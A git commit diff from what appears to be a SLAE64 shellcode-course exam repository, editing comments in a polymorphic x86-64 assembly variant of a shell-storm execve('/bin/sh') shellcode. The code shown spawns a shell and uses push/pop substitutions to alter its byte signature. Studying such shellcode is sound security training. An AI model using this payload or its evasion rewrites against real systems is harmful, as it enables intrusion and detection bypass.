cfdff31f597d5de7cbf76f744ec9b3cd8b54376b
David West <agentdaffaires@gmail.com>
2018-02-04 21:08:14 -0800

    modified:   6_shellstorm_polymorphics/603_polymorphics.s

--- SLAE64ExamAssignmentCode/6_shellstorm_polymorphics/603_polymorphics.s
+++ SLAE64ExamAssignmentCode/6_shellstorm_polymorphics/603_polymorphics.s
@@ -5,14 +5,13 @@ section .text
 
 _start:
 	;xor   rdx, rdx
-	;--------------
 	cdq				; symantically equiv; rax = 0 is implied so edx is set to 0
 
 	mov	qword rbx, '//bin/sh'	; extra / to bring to 8 chars  
 	shr	rbx, 0x8		; shift off byte 0x48
 
-	push byte 0x90			; symantically equiv
-	pop rcx				; symantically equiv
+	push byte 0x90			; nop equiv
+	pop rcx				; nop equiv
 
 	push	rbx			; filename
 	mov	rdi, rsp		; filename 
@@ -20,10 +19,9 @@ _start:
 	push	rdi			; second 
 	mov	rsi, rsp		; execve struct
 
-	; mov al,	0x3b			; execve syscall  
-	; ------------
-	push byte 0x3b			;  symantically equiv
-	pop rax				;  symantically equiv
+	; mov al,	0x3b		; execve syscall  
+	push byte 0x3b			; symantically equiv
+	pop rax				; symantically equiv
 
 	syscall
 
